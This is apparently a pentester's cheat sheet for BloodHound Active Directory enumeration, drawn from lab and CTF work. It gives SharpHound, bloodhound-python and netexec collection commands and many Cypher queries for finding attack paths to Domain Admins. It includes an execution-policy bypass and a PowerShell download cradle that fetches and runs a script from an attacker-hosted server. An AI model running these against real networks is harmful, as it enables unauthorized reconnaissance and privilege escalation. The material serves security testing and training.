
# Local

## Sharphound

```
/usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1  
```
  
### local  
```
cd /usr/share/metasploit-framework/data/post/powershell/  
python -m http.server 80  
```
  
### target  
```
powershell -ep bypass  
IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.180/SharpHound.ps1')  
```
  
#### Help Page  
```
Get-Help Invoke-BloodHound  
```
  
#### Get all info  
```
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\celia.almeda\Documents\ -OutputPrefix "audit"  
  
```

# Remote
## Bloodhound-python
```bash
# for Legacy
bloodhound-python -c all -u james -p 'J@m3s_P@ssW0rd!'  -ns 10.10.10.52 -d htb.local --zip

# For CE

bloodhound-ce-python -c all -u james -p 'J@m3s_P@ssW0rd!'  -ns 10.10.10.52 -d htb.local --zip
```

## Netexec 

```bash
nxc ldap 10.1.1.1 -u 'username' -p 'password' --bloodhound --collection ALL --dns-server 10.1.1.1
```
# Bloodhound
  
## local  
```
sudo neo4j start  
bloodhound  
```
  
## Raw Queries
### Get all Computers  
```
MATCH (m:Computer) RETURN m
```
  
### Get all Users  
```
MATCH (m:User) RETURN m  
```  
### Find sessions  
```
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p  
``` 
  
### Shortest path from to high value  
```
MATCH p=shortestPath((u {highvalue: false})-[*1..]->(g:Group {name: 'DOMAIN ADMINS@INFILTRATOR.HTB'})) WHERE NOT (u)-[:MemberOf*1..]->(:Group {highvalue: true}) RETURN p  
```  
## Other queries  

### Count the distinct users logon sessions on a domain :  
```
MATCH (u1:user)  
WITH count(u1) as totalUsers  
MATCH (c:Computer)-[r:HasSession]->(u2:User)  
RETURN COUNT(DISTINCT(u2))  
```
### Get All computers with their users logon sessions :  
```
MATCH c=(C:Computer)-[r2:HasSession*1]-(U:User)   
WHERE U.name =~ ".*" return c  
```  
### Get computers having a session from usernames like -Y´ADM.*¡ (matching specific OS) :  
```
MATCH p=((S:Computer)-[r:HasSession*1]->(T:User))  
WHERE T.name =~ "ADM.*"  
AND S.operatingsystem =~ ".*XP.*"  
RETURN p  
```  
### Find all Domain Admins :  
```
MATCH (n:Group) WHERE n.objectid =~ "(?i)S-1-5-21-.*-512" WITH n MATCH p=(n)<-[r:MemberOf*1..]-(m) RETURN n,r,m
```

### For all Well-known security identifiers: 
https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows.  
### Find all Domain Admins (nested SID S-1-5-21-.*-512) having a session opened on a domain computer :  

```
MATCH (m:User)-[r:MemberOf*1..]->(n:Group) WHERE n.objectid =~ "(?i)S-1-5-.*-512" WITH m MATCH q=((m)<-[:HasSession]-(o:Computer)) RETURN q  
```
### Show all high value target principals :  
```
MATCH (m {highvalue:true}) RETURN m  
```
### List of unique users with a path to a ´highvalue¡ targets :  
```
MATCH (u:User) MATCH (g {highvalue:true}) MATCH p = shortestPath((u:User)-[r:AddMember|AdminTo|AllExtendedRights|AllowedToDelegate|CanRDP|Contains|ExecuteDCOM|ForceChangePassword|GenericAll|GenericWrite|GpLink|HasSession|MemberOf|Owns|ReadLAPSPassword|TrustedBy|WriteDacl|WriteOwner|GetChanges|GetChangesAll*1..]->(g)) RETURN DISTINCT(u.name) AS USER, u.enabled as ENABLED,count(p) as PATHS order by u.name  
```
### Shortest paths from Domain Users to ´highvalue¡ targets :  
  ```
MATCH p=shortestPath((g:Group {name:"DOMAIN USERS@PHACKT.LOCAL"})-[*1..]->(n {highvalue:true})) WHERE g.objectid ENDS WITH '-513' AND g<>n return p  
  ```
### Find user with a username like ´ADM.*¡ who logged on a computer which has a owned local admin :  
  ```
MATCH c=(U:User {owned:true})-[r:AdminTo*1]-(C:Computer)-[r2:HasSession*1]-(P:User) WHERE P.name =~ "A_.*" return c  
  ```
### Find all edges that a ´specific user¡ has against all the nodes (HasSession is not calculated, as it is an edge that comes from computer to user, not from user to computer) :  
 ``` 
MATCH (n:User) WHERE n.name =~ 'HELPDESK@DOMAIN.GR' MATCH (m) WHERE NOT m.name = n.name MATCH p=allShortestPaths((n)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(m)) RETURN p  
 ``` 
### Find all the edges that any UNPRIVILEGED user (based on the admincount:False) has against all the nodes :      

```
MATCH (n:User {admincount:False}) MATCH (m) WHERE NOT m.name = n.name MATCH p=allShortestPaths((n)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(m)) RETURN p  
```

### Find interesting edges related to ´ACL Abuse¡ that unprivileged users have against other users :  

```
MATCH (n:User {admincount:False}) MATCH (m:User) WHERE NOT m.name = n.name MATCH p=allShortestPaths((n)-[r:AllExtendedRights|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner*1..]->(m)) RETURN p  
```

### Find interesting edges related to ´ACL Abuse¡ that unprivileged users have against computers :  
  
```
MATCH (n:User {admincount:False}) MATCH p=allShortestPaths((n)-[r:AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|AdminTo|CanRDP|ExecuteDCOM|ForceChangePassword*1..]->(m:Computer)) RETURN p  
```

### Find if unprivileged users have rights to add members into groups :   
```
MATCH (n:User {admincount:False}) MATCH p=allShortestPaths((n)-[r:AddMember*1..]->(m:Group)) RETURN p  
```
  
### Find only the AdminTo privileges (edges) of the domain users against the domain computers :         
```
MATCH p1=shortestPath(((u1:User)-[r1:MemberOf*1..]->(g1:Group))) MATCH p2=(u1)-[:AdminTo*1..]->(c:Computer) RETURN p2  
```
### Find which groups canRDP to computers :  
```
MATCH (n:Group) MATCH (m:Computer) MATCH p=allShortestPaths((n)-[r:CanRDP*1..]->(m)) RETURN p  
 ``` 
 
The canRDP edge runs from a user or a group to a computer and incates that the principals are part of the Remote Desktop Users local group on the target system.  

### Find what groups have local admin rights :             
```
MATCH p=(m:Group)-[r:AdminTo]->(n:Computer) RETURN m.name, n.name ORDER BY m.name  
```  
### Find what users have local admin rights :                
``` 
MATCH p=(m:User)-[r:AdminTo]->(n:Computer) RETURN m.name, n.name ORDER BY m.name  
``` 


### Mark a user as owned :  
```
MATCH (n:User) WHERE n.name STARTS WITH toUpper('brobin') SET n.owned=true RETURN n  
```
### Displays all GPOs :  
```
Match (n: GPO) return n  
```
### Displays all GPOs containing a ´keyword¡ in their name  
```
Match (n: GPO) WHERE n.name CONTAINS "SERVER" return n  
```
### Find if a domain user has some interesting rights on a GPO :  

```
MATCH p = (u: User) - [r: AllExtendedRights | GenericAll | GenericWrite | Owns | WriteDacl | WriteOwner | GpLink * 1 ..] -> (g: GPO) RETURN p LIMIT 25
```